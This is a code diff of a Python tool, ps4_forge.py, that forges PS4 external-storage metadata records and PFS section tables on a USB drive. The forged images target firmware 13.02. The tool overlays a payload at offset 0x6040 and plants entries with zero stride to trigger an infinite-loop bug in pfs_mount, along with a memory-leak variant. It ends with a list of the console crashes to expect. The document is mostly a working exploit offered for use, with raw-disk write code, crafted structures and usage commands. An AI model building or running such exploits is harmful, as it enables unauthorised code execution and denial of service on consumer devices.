@@ -1,61 +1,67 @@
 #!/usr/bin/env python3
 """
-fahrenheit.py — PFS section-table forger (PS4 13.02)
+ps4_forge.py — merged Fahrenheit + PFS section-table forger (PS4 13.02)
 
-Corrected entry layout (from pfs_mount decompile, FUN_00ea1480):
+Two primitives, one tool, one raw-I/O layer.
 
-    +0x00  u32 id          -- nonzero keeps the loop in the body
-    +0x04  u32 flags
-    +0x08  u32 name_len    -- length arg to FUN_00bc6380 (strncmp)
-    +0x0C  u32 stride      -- walker advance; 0 = infinite loop (bug A)
-    +0x10  u8  name[...]
+  --mode record   Fahrenheit-style: patch len_a/len_b, overlay payload at
+                  0x6040 of the metadata record. Writes a valid record image.
 
-Walker:
-    piVar3  = (u8*)piVar38 + piVar38[3] + 0x14;
-    piVar38 = (u8*)piVar38 + piVar38[3];
-    while (piVar3 < end);
+  --mode loop     pfs_mount walker bug A: entry with stride=0, id!=0.
+  --mode leak     bug A + name_len=0 (blk_bitmap branch fires each iter,
+                  leaks at least 0x200/iter plus buffer-cache allocations).
+  --mode payload  overlay only, no table.
+  --mode all      loop entry + payload overlay.
 
-If piVar38[3] == 0 and *piVar38 != 0, neither pointer advances.
+  --diagnose      read 0x6000..0x6080 and report. No writes.
+  --scan          scan disk for section-table-like patterns. No writes.
 
-Modes:
-    loop     -- stride=0, id!=0, name="blk_bitmap", name_len=len+1
-    leak     -- stride=0, id!=0, name_len=0 (strncmp len 0 always matches,
-                blk_bitmap branch fires every iteration, leaks 0x200+0x80000
-                per cycle)
-    payload  -- overlay only, no table
-    all      -- loop entry + payload overlay
+Shared primitives:
+  --list          enumerate physical disks
+  --no-write      produce merged image, skip device write
+  --force         required for any device write
 
-Reads block 0 of the partition (disk byte = partition_lba * 512). The
-default --table-off assumes a partition at LBA 2048 (= 0x100000 disk byte).
-Override with --table-off to match the actual partition start of your drive.
-
-Requires jm_real.bin as skeleton. Refuses to write without --force.
+Requires jm_real.bin as skeleton for every write.
+Refuses to write without --force.
 
 Usage:
-    python fahrenheit.py --scan --disk 1                     # locate table
-    python fahrenheit.py --mode loop --table-off 0x100000 --no-write
-    python fahrenheit.py --mode loop --table-off 0x100000 --disk 1 --force
-    python fahrenheit.py --mode leak --table-off 0x100000 --disk 1 --force
-    python fahrenheit.py --mode all --payload payload.bin --table-off 0x100000 --disk 1 --force
+    python ps4_forge.py --list
+    python ps4_forge.py --diagnose --disk 1
+    python ps4_forge.py --scan --disk 1 --scan-end 0x200000
+
+    python ps4_forge.py --mode record --payload payload.bin --no-write
+    python ps4_forge.py --mode record --payload payload.bin --disk 1 --force
+
+    python ps4_forge.py --mode loop  --table-off 0x100000 --no-write
+    python ps4_forge.py --mode loop  --table-off 0x100000 --disk 1 --force
+    python ps4_forge.py --mode leak  --table-off 0x100000 --disk 1 --force
+    python ps4_forge.py --mode all   --payload payload.bin \
+                                    --table-off 0x100000 --disk 1 --force
 """
 
 import os, sys, json, struct, platform, subprocess, argparse
 from pathlib import Path
 from typing import Optional
 
-# --------------------------------------------------------------- constants
+# =============================================================== constants
 LABEL       = b"PS4 External Storage Metadata R\x00"
 LABEL_OFF   = 0x6000
+VER_OFF     = 0x6024
+LEN_A_OFF   = 0x6030
+LEN_B_OFF   = 0x6038
+BODY_OFF    = 0x6040
 SECTOR      = 512
-ENTRY_SIZE  = 0x38                       # fixed-size guess; --stride overrides
-DEFAULT_TABLE_OFF = 0x100000             # partition at LBA 2048
-DEFAULT_BODY_OFF  = 0x6040               # payload landing zone in record
+
+LEN_A_GOOD  = 0x000000E86A034000
+LEN_B_GOOD  = 0x000000E86A00E000
+
+ENTRY_SIZE         = 0x38        # section entry fixed stride (guess)
+DEFAULT_TABLE_OFF  = 0x100000    # partition at LBA 2048
 
 IS_WIN = platform.system() == "Windows"
 IS_LIN = platform.system() == "Linux"
 IS_MAC = platform.system() == "Darwin"
 HERE   = Path(__file__).resolve().parent
-
 
 # =============================================================== raw I/O
 if IS_WIN:
@@ -88,8 +94,7 @@ if IS_WIN:
 
     def _open(path, write):
         h = _k32.CreateFileW(
-            path,
-            _GR | (_GW if write else 0),
+            path, _GR | (_GW if write else 0),
             _SHARE_RW, None, _OPEN_EXISTING, 0, None)
         hv = getattr(h, "value", h) or 0
         if isinstance(hv, int) and hv < 0:
@@ -107,7 +112,6 @@ if IS_WIN:
             raise OSError(f"seek {off:#x}: {ctypes.get_last_error()}")
 
     def _read(h, off, n):
-        # Windows raw reads need sector-aligned offset and length.
         base = (off // SECTOR) * SECTOR
         delta = off - base
         want = n + delta
@@ -252,7 +256,6 @@ else:
     def is_system_disk(n):
         return False
 
-
 # =============================================================== helpers
 
 def hexdump(data, base=0, width=16):
@@ -263,7 +266,6 @@ def hexdump(data, base=0, width=16):
         t = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
         out.append(f"  {base+i:08x}  {h:<{width*3}}  {t}")
     return "\n".join(out)
-
 
 def find_file(name, explicit=None):
     if explicit:
@@ -276,79 +278,98 @@ def find_file(name, explicit=None):
             return cand
     return None
 
+def read_file(path, required=True, label=""):
+    p = Path(path)
+    if not p.exists():
+        if required:
+            raise SystemExit(f"missing: {path}")
+        return None
+    data = p.read_bytes()
+    print(f"{label or 'file':<8}: {p} ({len(data):,} bytes)")
+    return data
 
-# =============================================================== entry build
+def pick_removable(disks):
+    cand = [d for d in disks
+            if "USB" in d.get("iface", "").upper()
+            or d.get("media", "").lower().startswith("remov")]
+    return cand or disks
 
-def make_entry(eid, flags, name_len, stride, name=b"", entry_size=None):
-    es = entry_size or ENTRY_SIZE
-    e = bytearray(es)
-    struct.pack_into("<I", e, 0x00, eid & 0xFFFFFFFF)
-    struct.pack_into("<I", e, 0x04, flags & 0xFFFFFFFF)
-    struct.pack_into("<I", e, 0x08, name_len & 0xFFFFFFFF)
-    struct.pack_into("<I", e, 0x0C, stride & 0xFFFFFFFF)
-    room = es - 0x10
-    if room > 0:
-        nb = name[:room]
-        e[0x10:0x10+len(nb)] = nb
-    return bytes(e)
+# =============================================================== diagnose
 
+def diagnose(disk_index):
+    if is_system_disk(disk_index):
+        print(f"refusing: disk {disk_index} hosts the system volume")
+        return 2
+    path = devpath(disk_index)
+    print(f"diagnosing {path}")
+    try:
+        h = _open(path, False)
+    except OSError as e:
+        print(f"  cannot open: {e}")
+        return 1
+    try:
+        head = _read(h, LABEL_OFF, 0x100)
+        print(f"  bytes at 0x{LABEL_OFF:X} (256):")
+        print(hexdump(head, base=LABEL_OFF))
 
-def build_loop_entry(entry_size=None):
-    """Bug A: stride=0, id!=0, name matches 'blk_bitmap'."""
-    return make_entry(
-        eid=2, flags=0,
-        name_len=len(b"blk_bitmap") + 1,
-        stride=0,
-        name=b"blk_bitmap",
-        entry_size=entry_size)
+        if head.startswith(LABEL):
+            print(f"  label: PRESENT at 0x{LABEL_OFF:X}")
+        else:
+            idx = head.find(LABEL)
+            if idx >= 0:
+                print(f"  label: found at 0x{LABEL_OFF+idx:X}")
+            else:
+                window = _read(h, 0, 0x10000)
+                idx = window.find(LABEL[:16])
+                if idx >= 0:
+                    print(f"  label: found at 0x{idx:X} in first 64 KB")
+                else:
+                    print("  label: NOT FOUND in first 64 KB")
+                    print("  -> this drive has no PS4 metadata record")
 
+        ver = _read(h, VER_OFF, 4)
+        print(f"  version at 0x{VER_OFF:X}: {ver.hex()}  "
+              f"({struct.unpack('<I', ver)[0]})")
 
-def build_leak_entry(entry_size=None):
-    """Bug A + alloc leak: stride=0, name_len=0 (strncmp len 0 always matches)."""
-    return make_entry(
-        eid=2, flags=0,
-        name_len=0, stride=0,
-        name=b"",
-        entry_size=entry_size)
+        a = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
+        b = struct.unpack("<Q", _read(h, LEN_B_OFF, 8))[0]
+        print(f"  len_a  at 0x{LEN_A_OFF:X}: {a:#018x}")
+        print(f"  len_b  at 0x{LEN_B_OFF:X}: {b:#018x}")
+        print(f"  expected a: {LEN_A_GOOD:#018x}")
+        print(f"  expected b: {LEN_B_GOOD:#018x}")
 
+        body = _read(h, BODY_OFF, 0x80)
+        print(f"  body at 0x{BODY_OFF:X} (128):")
+        print(hexdump(body, base=BODY_OFF))
+        return 0
+    finally:
+        _close(h)
 
 # =============================================================== scan
 
 def scan_for_section_table(disk_index, start=0x0, end=0x200000,
                            entry_size=None):
-    """
-    Read a window and look for patterns resembling a section table.
-
-    Fixed-size assumption: consecutive entries at stride = entry_size.
-    If the real entries use variable stride (name_len-dependent), the
-    scan will miss them. In that case, search by string name.
-    """
     es = entry_size or ENTRY_SIZE
-
     if is_system_disk(disk_index):
         raise SystemExit(f"refusing: disk {disk_index} hosts the system")
     path = devpath(disk_index)
     h = _open(path, False)
     try:
-        window = end - start
-        data = _read(h, start, window)
+        data = _read(h, start, end - start)
     finally:
         _close(h)
 
     hits = []
-    for off in range(0, window - es * 2, 4):
+    for off in range(0, len(data) - es * 2, 4):
         e0_id     = struct.unpack_from("<I", data, off + 0x00)[0]
-        e0_flags  = struct.unpack_from("<I", data, off + 0x04)[0]
         e0_nameln = struct.unpack_from("<I", data, off + 0x08)[0]
         e0_stride = struct.unpack_from("<I", data, off + 0x0C)[0]
-        if e0_id == 0:
-            continue
-        if not (0 < e0_nameln <= 0x40):
+        if e0_id == 0 or not (0 < e0_nameln <= 0x40):
             continue
         if not (0x10 <= e0_stride <= 0x400):
             continue
         e1_off = off + e0_stride
-        if e1_off + 0x10 > window:
+        if e1_off + 0x10 > len(data):
             continue
         e1_id     = struct.unpack_from("<I", data, e1_off + 0x00)[0]
         e1_nameln = struct.unpack_from("<I", data, e1_off + 0x08)[0]
@@ -360,15 +381,12 @@ def scan_for_section_table(disk_index, start=0x0, end=0x200000,
         name0 = data[off + 0x10: off + 0x10 + min(e0_nameln, 0x20)]
         hits.append((start + off, e0_id, e0_nameln, e0_stride, name0))
 
-    # Also scan for the literal string "blk_bitmap" -- names are inline in
-    # the entry. This catches variable-stride tables.
     needle = b"blk_bitmap"
     i = 0
     while True:
         j = data.find(needle, i)
         if j < 0:
             break
-        # Entry start should be needle_off - 0x10 if name is inline at +0x10
         candidate = j - 0x10
         if candidate >= 0:
             hits.append((start + candidate, -1, -1, -1, needle))
@@ -391,14 +409,58 @@ def scan_for_section_table(disk_index, start=0x0, end=0x200000,
         else:
             print(f"  0x{off:08X}  (string hit)  name={printable!r}")
 
+# =============================================================== entry build
+
+def make_entry(eid, flags, name_len, stride, name=b"", entry_size=None):
+    es = entry_size or ENTRY_SIZE
+    e = bytearray(es)
+    struct.pack_into("<I", e, 0x00, eid & 0xFFFFFFFF)
+    struct.pack_into("<I", e, 0x04, flags & 0xFFFFFFFF)
+    struct.pack_into("<I", e, 0x08, name_len & 0xFFFFFFFF)
+    struct.pack_into("<I", e, 0x0C, stride & 0xFFFFFFFF)
+    room = es - 0x10
+    if room > 0:
+        nb = name[:room]
+        e[0x10:0x10+len(nb)] = nb
+    return bytes(e)
+
+def build_loop_entry(entry_size=None):
+    """Bug A: stride=0, id!=0, name='blk_bitmap'."""
+    return make_entry(eid=2, flags=0,
+                      name_len=len(b"blk_bitmap") + 1,
+                      stride=0, name=b"blk_bitmap",
+                      entry_size=entry_size)
+
+def build_leak_entry(entry_size=None):
+    """Bug A + alloc leak: stride=0, name_len=0 (strncmp len 0 always matches)."""
+    return make_entry(eid=2, flags=0,
+                      name_len=0, stride=0, name=b"",
+                      entry_size=entry_size)
 
 # =============================================================== forge
 
-def forge(base: bytes, mode: str, payload: bytes,
-          table_off: int, body_off: int, entry_size=None):
+def forge_record(base: bytes, payload: bytes, body_off: int = BODY_OFF) -> bytes:
+    """Fahrenheit mode: patch len fields, overlay payload at body_off."""
     if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
         raise SystemExit(f"base has no PS4 label at 0x{LABEL_OFF:X}")
+    size = max(len(base), body_off + len(payload))
+    size = (size + SECTOR - 1) // SECTOR * SECTOR
+    img = bytearray(size)
+    img[:len(base)] = base
+    struct.pack_into("<Q", img, LEN_A_OFF, LEN_A_GOOD)
+    struct.pack_into("<Q", img, LEN_B_OFF, LEN_B_GOOD)
+    if payload:
+        end = min(len(img), body_off + len(payload))
+        n = end - body_off
+        if n > 0:
+            img[body_off:end] = payload[:n]
+    return bytes(img)
 
+def forge_pfs(base: bytes, mode: str, payload: bytes,
+              table_off: int, body_off: int, entry_size=None) -> bytes:
+    """pfs_forge mode: craft section table, optionally overlay payload."""
+    if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
+        raise SystemExit(f"base has no PS4 label at 0x{LABEL_OFF:X}")
     size = max(len(base), body_off + len(payload), table_off + 0x400)
     size = (size + SECTOR - 1) // SECTOR * SECTOR
     img = bytearray(size)
@@ -427,10 +489,9 @@ def forge(base: bytes, mode: str, payload: bytes,
 
     return bytes(img)
 
-
 # =============================================================== write
 
-def write_image(disk_index, img, table_off, entry_size=None):
+def write_image(disk_index, img, verify_table_off=None, entry_size=None):
     es = entry_size or ENTRY_SIZE
     if is_system_disk(disk_index):
         raise SystemExit(f"refusing: disk {disk_index} hosts the system")
@@ -474,16 +535,22 @@ def write_image(disk_index, img, table_off, entry_size=None):
     try:
         lab = _read(h, LABEL_OFF, len(LABEL) + 4)
         ok_lab = lab.startswith(LABEL)
-        tbl = _read(h, table_off, es)
-        tbl_id  = struct.unpack_from("<I", tbl, 0x00)[0]
-        tbl_str = struct.unpack_from("<I", tbl, 0x0C)[0]
         print(f"  label  {'OK' if ok_lab else 'MISSING'}")
-        print(f"  table  id={tbl_id} stride=0x{tbl_str:X}")
-        print(hexdump(tbl, base=table_off))
-        return ok_lab and tbl_id != 0
+
+        if verify_table_off is not None:
+            tbl = _read(h, verify_table_off, es)
+            tbl_id  = struct.unpack_from("<I", tbl, 0x00)[0]
+            tbl_str = struct.unpack_from("<I", tbl, 0x0C)[0]
+            print(f"  table  id={tbl_id} stride=0x{tbl_str:X}")
+            print(hexdump(tbl, base=verify_table_off))
+
+        a = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
+        b = struct.unpack("<Q", _read(h, LEN_B_OFF, 8))[0]
+        print(f"  len_a  {'OK' if a == LEN_A_GOOD else 'MISMATCH'}  {a:#018x}")
+        print(f"  len_b  {'OK' if b == LEN_B_GOOD else 'MISMATCH'}  {b:#018x}")
+        return ok_lab
     finally:
         _close(h)
-
 
 # =============================================================== main
 
@@ -491,28 +558,41 @@ def main():
     ap = argparse.ArgumentParser(
         description=__doc__,
         formatter_class=argparse.RawDescriptionHelpFormatter)
-    ap.add_argument("--mode", choices=["loop", "leak", "payload", "all"],
-                    default="loop")
-    ap.add_argument("--payload", default=None)
-    ap.add_argument("--base",    default=None)
-    ap.add_argument("--disk",    type=int, default=None)
-    ap.add_argument("--out",     default="merged_pfs.bin")
+    ap.add_argument("--mode",
+                    choices=["record", "loop", "leak", "payload", "all"],
+                    default="record",
+                    help="record = Fahrenheit-style metadata record merge; "
+                         "loop/leak/payload/all = PFS section-table forge")
+    ap.add_argument("--payload", default=None,
+                    help="payload.bin path (optional for record, optional "
+                         "for loop/leak, used for payload/all)")
+    ap.add_argument("--base", default=None,
+                    help="jm_real.bin path (required for any write)")
+    ap.add_argument("--disk", type=int, default=None)
+    ap.add_argument("--out", default=None,
+                    help="merged image output (default: merged_<mode>.bin)")
     ap.add_argument("--table-off", type=lambda x: int(x, 0),
-                    default=DEFAULT_TABLE_OFF)
-    ap.add_argument("--body-off",  type=lambda x: int(x, 0),
-                    default=DEFAULT_BODY_OFF)
+                    default=DEFAULT_TABLE_OFF,
+                    help="section table offset (pfs modes)")
+    ap.add_argument("--body-off", type=lambda x: int(x, 0),
+                    default=BODY_OFF,
+                    help="payload overlay offset (record + all modes)")
     ap.add_argument("--entry-size", type=lambda x: int(x, 0),
                     default=ENTRY_SIZE,
-                    help="section entry size (default 0x38)")
+                    help="section entry stride (default 0x38)")
     ap.add_argument("--scan", action="store_true",
-                    help="scan for section-table-like patterns (read-only)")
+                    help="scan for section-table patterns (read-only)")
     ap.add_argument("--scan-end", type=lambda x: int(x, 0),
                     default=0x200000)
-    ap.add_argument("--no-write", action="store_true")
+    ap.add_argument("--diagnose", action="store_true",
+                    help="read record region and report (read-only)")
     ap.add_argument("--list", action="store_true")
-    ap.add_argument("--force", action="store_true")
+    ap.add_argument("--no-write", action="store_true")
+    ap.add_argument("--force", action="store_true",
+                    help="required for any device write")
     args = ap.parse_args()
 
+    # -------- list --------------------------------------------------------
     if args.list:
         for d in list_disks():
             gb = d.get("size", 0) / (1024**3)
@@ -521,6 +601,13 @@ def main():
                   f"{d.get('path', devpath(d['index']))}  {d.get('model', '')}")
         return
 
+    # -------- diagnose ----------------------------------------------------
+    if args.diagnose:
+        if args.disk is None:
+            sys.exit("--diagnose requires --disk N")
+        sys.exit(diagnose(args.disk))
+
+    # -------- scan --------------------------------------------------------
     if args.scan:
         if args.disk is None:
             sys.exit("--scan requires --disk N")
@@ -528,6 +615,7 @@ def main():
                                entry_size=args.entry_size)
         return
 
+    # -------- forge / write ----------------------------------------------
     if not args.no_write and not args.force:
         sys.exit("refusing to write without --force")
 
@@ -538,48 +626,66 @@ def main():
     print(f"base    : {base_path} ({len(base):,} bytes)")
 
     payload = b""
-    if args.mode in ("payload", "all"):
+    if args.mode in ("record", "payload", "all") or args.payload:
         p = find_file("payload.bin", args.payload)
         if p is None:
-            print("payload.bin not found; continuing without payload")
+            if args.mode in ("payload", "all"):
+                print("payload.bin not found; continuing without payload")
+            else:
+                print("payload.bin not found; record will patch len fields only")
         else:
             payload = p.read_bytes()
             print(f"payload : {p} ({len(payload):,} bytes)")
 
-    img = forge(base, args.mode, payload,
-                args.table_off, args.body_off,
-                entry_size=args.entry_size)
+    if args.mode == "record":
+        img = forge_record(base, payload, body_off=args.body_off)
+        out_default = "merged_record.bin"
+        table_for_verify = None
+    else:
+        img = forge_pfs(base, args.mode, payload,
+                        table_off=args.table_off,
+                        body_off=args.body_off,
+                        entry_size=args.entry_size)
+        out_default = f"merged_{args.mode}.bin"
+        table_for_verify = args.table_off
 
-    Path(args.out).write_bytes(img)
-    print(f"merged  : {args.out} ({len(img):,} bytes)")
-    print(f"table at 0x{args.table_off:X}  mode={args.mode}  "
-          f"entry_size=0x{args.entry_size:X}")
-    print(hexdump(img[args.table_off:args.table_off + 0x80],
-                  base=args.table_off))
+    out_path = args.out or out_default
+    Path(out_path).write_bytes(img)
+    print(f"merged  : {out_path} ({len(img):,} bytes)")
+    if args.mode != "record":
+        print(f"table at 0x{args.table_off:X}  mode={args.mode}  "
+              f"entry_size=0x{args.entry_size:X}")
+        print(hexdump(img[args.table_off:args.table_off + 0x80],
+                      base=args.table_off))
 
     if args.no_write:
         return
 
+    # -------- pick disk ---------------------------------------------------
+    disks = list_disks()
     disk = args.disk
     if disk is None:
-        cand = [d for d in list_disks()
-                if "USB" in d.get("iface", "").upper()
-                or d.get("media", "").lower().startswith("remov")]
+        cand = pick_removable(disks)
         if not cand:
-            sys.exit("no removable disk; pass --disk N")
+            sys.exit("no disk candidate; pass --disk N")
         disk = cand[0]["index"]
         print(f"auto-picked disk {disk}")
 
-    write_image(disk, img, args.table_off, entry_size=args.entry_size)
+    # -------- write -------------------------------------------------------
+    ok = write_image(disk, img,
+                     verify_table_off=table_for_verify,
+                     entry_size=args.entry_size)
     print()
-    print("done. Eject. Insert. Tap 'Use This Extended Storage'.")
-    print("Expected:")
-    print("  LED solid, console hangs             -> bug A fired")
-    print("  LED flashing, then reboot            -> bug A + watchdog")
-    print("  Runs out of memory, reboots          -> leak mode")
-    print("  Identical to baseline                -> table not at --table-off,")
-    print("                                          or table is encrypted")
-
+    if args.mode == "record":
+        print("done. Eject, insert into PS4, tap 'Use This Extended Storage'.")
+    else:
+        print("done. Eject. Insert. Tap 'Use This Extended Storage'.")
+        print("Expected:")
+        print("  LED solid, console hangs    -> bug A fired")
+        print("  LED flashing, then reboot   -> bug A + watchdog")
+        print("  Runs out of memory, reboots -> leak mode")
+        print("  Identical to baseline       -> table not at --table-off,")
+        print("                                  or table is encrypted")
 
 if __name__ == "__main__":
     main()
